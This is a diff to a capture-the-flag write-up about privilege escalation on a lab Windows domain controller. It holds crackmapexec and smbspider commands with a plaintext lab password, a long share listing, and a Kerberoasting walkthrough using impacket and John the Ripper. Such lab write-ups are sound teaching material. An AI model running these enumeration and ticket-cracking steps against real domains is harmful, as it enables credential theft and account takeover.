@@ -117,7 +117,7 @@ smb: \SVC_TGS\Desktop\> get user.txt
 
 ## PrivEsc:
 
-> This box was not trivial. You couldn't simply execute commands with CME. In addition, the new access on the SMB sharing with the identifiers found were a rabbit hole.
+> This box was not trivial. You cannot simply execute commands with CME. In addition, the new access on the SMB sharing with the identifiers found were a rabbit hole.
 
 ```
 crackmapexec 10.10.10.100 -u SVC_TGS -p "GPPstillStandingStrong2k18" --shares  
@@ -151,16 +151,54 @@ smbspider.py -u SVC_TGS -p GPPstillStandingStrong2k18 -h 10.10.10.100 -s Users
 
  [*] Spidering 1 system(s)...
 
+ [*] Attempting to spider smb://10.10.10.100/Users 
+ [*] \\10.10.10.100\Users\desktop.ini
+ [*] \\10.10.10.100\Users\All Users\ATUS_STOPPED_ON_SYMLINK listing \All Users\
+ [*] \\10.10.10.100\Users\Default\NTUSER.DAT
+ [*] \\10.10.10.100\Users\Default\NTUSER.DAT.LOG
+ [*] \\10.10.10.100\Users\Default\NTUSER.DAT.LOG1
+ [*] \\10.10.10.100\Users\Default\NTUSER.DAT.LOG2
+ [*] \\10.10.10.100\Users\Default\NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+ [*] \\10.10.10.100\Users\Default\NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+ [*] \\10.10.10.100\Users\Default\NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+ [*] \\10.10.10.100\Users\SVC_TGS\Desktop\user.txt
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\desktop.ini
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Server Manager.lnk
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Window Switcher.lnk
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\SendTo\Compressed (zipped) Folder.ZFSendToTarget
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\SendTo\Desktop (create shortcut).DeskLink
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\SendTo\Desktop.ini
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\SendTo\Mail Recipient.MAPIMail
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Command Prompt.lnk
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Desktop.ini
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Notepad.lnk
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Run.lnk
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Windows Explorer.lnk
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\Desktop.ini
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\Help.lnk
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Desktop.ini
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Ease of Access.lnk
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Magnify.lnk
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Narrator.lnk
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\On-Screen Keyboard.lnk
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\computer.lnk
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Control Panel.lnk
+ [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Desktop.ini
+ [*] Finished with smb://10.10.10.100/Users. [Remaining: 0] 
+
 -----
 Completed in: 46.9s
 
 ```
 
+> Ok now let's play with that three heads bastard! ;) 
+
 <img src="/assets/images/kerberos.jpg" style="height: 100%; width: auto">
 
-With the SVC_TGS service's credentials, it's possible to ask kerberos for more; Request a legitimate TGT and which service(s) this account can use. Although it's not possible to execute commands as SVC_TGS with CME nor MimiKatz, it's to create packets with [impacket ](https://github.com/SecureAuthCorp/impacket) similarly to execute `ps> klist` on the machine, for example. This would give the name(s) of the (SPNs) service principal name(s) to which the SVC_TGS account has access. 
+Since I have found valid credentials for the SVC_TGS service, I can ask kerberos for more; Request a legitimate TGT and which service(s) this account can use. Although I can't execute commands as SVC_TGS with CME nor MimiKatz, I'm able to create packets with [impacket ](https://github.com/SecureAuthCorp/impacket) as if I were executing `ps> klist` on the machine, for example. This would give me the name(s) of the (SPNs)service principal name(s) to which the SVC_TGS account has access. 
 
-Then, with a SPN and a TGT, creating a TGS-REQ to Kerberos is now possible. The great thing about a TGS is that it allows you to crack the service's password offline. Yeah! ;) 
+Then, with a SPN and a TGT, I can create a TGS-REQ and send it to Kerberos. The great thing about a TGS is that it allows you to crack the service's password offline. Yeah! ;) 
 
 <img src="/assets/images/impacket_GetUserSPNs.png" style="height: 100%; width: auto">
 
@@ -182,7 +220,7 @@ $krb5tgs$<ENCRYPTION_TYPE>$*<USERNAME>$<REALM>$<SPN>*$<FIRST_16_BYTES_TICKET>$<R
 <img src="/assets/images/krb5tgs.png" style="height: 100%; width: auto">
 
 
-With a TGS, we can retrieve the Service's password. If you run Kali, you will need to follow these steps for JTR to recognize the format.
+Now that we have a TGS, we can retrieve the Service's password. If you run Kali, you will need to follow these steps for JTR to recognize the format.
 
 ```
 git clone https://github.com/magnumripper/JohnTheRipper.git && cd JohnTheRipper/src
